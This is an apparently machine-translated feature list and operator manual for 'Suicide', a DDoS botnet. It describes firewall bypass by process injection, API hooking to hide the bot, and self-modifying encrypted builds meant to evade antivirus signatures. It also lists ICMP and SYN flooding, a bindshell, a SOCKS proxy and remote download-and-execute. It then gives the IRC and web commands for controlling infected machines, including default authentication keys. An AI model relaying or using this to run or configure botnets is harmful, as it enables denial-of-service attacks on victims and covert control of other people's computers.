<strong>Suicide</strong>: DDoS-bot (c) RKL aka Cr4sh <br>
<strong>Features:</strong> <br>
- Management a bot through web and IRC <br>
- Support in IRC a little bit simultaneously working botmasters <br>
- Authentification on IRC with the help of a key <br>
- Division botmasters on a level of access rights <br>
- Firewall detouring by injecting of the code in the entrusted process <br>
- Detour of the control of components of alternatively reception by a method handles and start of a "malicious" code <br>
- Masking in system a method of interception of API-functions CreateProcessW, RegEnumValue, FindNextFileA, FindNextFileW <br>
- Use selfmodifycation code for protection of yours build from research (accordingly, nobody can learn your configuration of a bot) <br>
- Enciphering a body of a bot by casual image generated key (that in pair with selfmodifycation code and own algorithms completely excludes detection of a bot signature analyzers NEVER will generate two identical spears of a bot) <br>
- ICMP-flooder <br>
- SYN-flooder <br>
- Plugin engine (can load any quantity of plug-ins "hurriedly" in the form of DLL-files) <br>
- Display of the information about controlled machine <br>
- Bindshell <br>
- A SOCKS4-proxy <br>
- Function of uploading and start of an any file <br>
- Function of self-destruction <br>
- Dialogue with the user controlled machine through MessageBox =))) <br>
- A convenient web-interface with an opportunity destination to different bots different commands <br>
<strong>The list of IRC-commands:</strong> <br>
- <strong>!su</strong> <em>hash</em> - authorization for the further botnet controlling , hash should be generated by the program hash.exe: <strong>hash.exe</strong> <em>user_id_on_channel key</em>. A key - any value of type integer, by default for root (0 gid) - 3927555, for simple user - 31337. <br>
For example: <br>
<pre> 
C: \&gt; hash: RKL!cr4sh@224BEAE1.EF026A60.32D84835.IP 31337 
str = :RKL!cr4sh@224BEAE1.EF026A60.32D84835.IP 
key = 31337
hash = 48659496128643785403785944323783784324320
C: \&gt; </pre>Logout the user automatic, at leaving of the channel.<p>- <strong>!icmp</strong> <em>hostname_or_ip</em> - ICMP-flood attack to a host <br>
- <strong>!syn</strong> <em>hostname_or_ip</em> - SYN-flood attack to a host <br>
- <strong>!stop</strong> - to stop attack <br>
- <strong>!download</strong> <em>filename_on_remote_machine URL</em> - to load and execute .exe a file <br>
- <strong>!message</strong> <em>the text</em> - to show by grasped machine MessageBox with the specified text <br>
- <strong>!stop</strong> - to switch off the IRC-client <br>
- <strong>!delplugin</strong> <em>name</em> - to remove a plug-in-<strong>! updateplugins</strong> - to update plug-ins immediately <br>
- <strong>!sysinf</strong> - viewing of the information on system <br>
- <strong>!die</strong> - self-destruction <br>
- <strong>!set freq</strong> <em>value</em> - frequency of packet sending by flooder in milliseconds (default 4) <br>
- <strong>!set packetsize</strong> <em>value</em> - the size of an ICMP-package of flooder in bytes (default 50000) <br>
- <strong>!key</strong> <em>gid a key</em> - installation of a key of hash-function for selected gid. Simple users have gid 1, the first 3 commands are accessible to them only. Users with absolutely rights have gid 0, commands are accessible to them all<p> The List of commands of web-environment of management: <br>
- <strong>icmp</strong> <em>имя_хоста_или_ip</em> - ICMP-flood attack to a host <br>
- <strong>syn</strong> <em>имя_хоста_или_ip</em> - SYN-flood attack to a host <br>
- <strong>stop</strong> - to stop attack <br>
- <strong>download</strong> <em>имя_файла_на_машине URL</em> - to load and execute .exe a file <br>
- <strong>message</strong> <em>the text</em> - to show by grasped machine MessageBox with the specified text <br>
- <strong>die</strong> - self-destruction <br>
- <strong>irc</strong> <em>ip_адресс номер_порта</em> - installation of parameters of the IRC-client. The bot finishes current IRC-session and incorporates to a server to the specified address<p> The Adjustments established by a command<br>
- <strong>! set</strong> together with keys of hash-function are kept in the register. Them defaults values together with other parameters you may set in builder</SPAN>
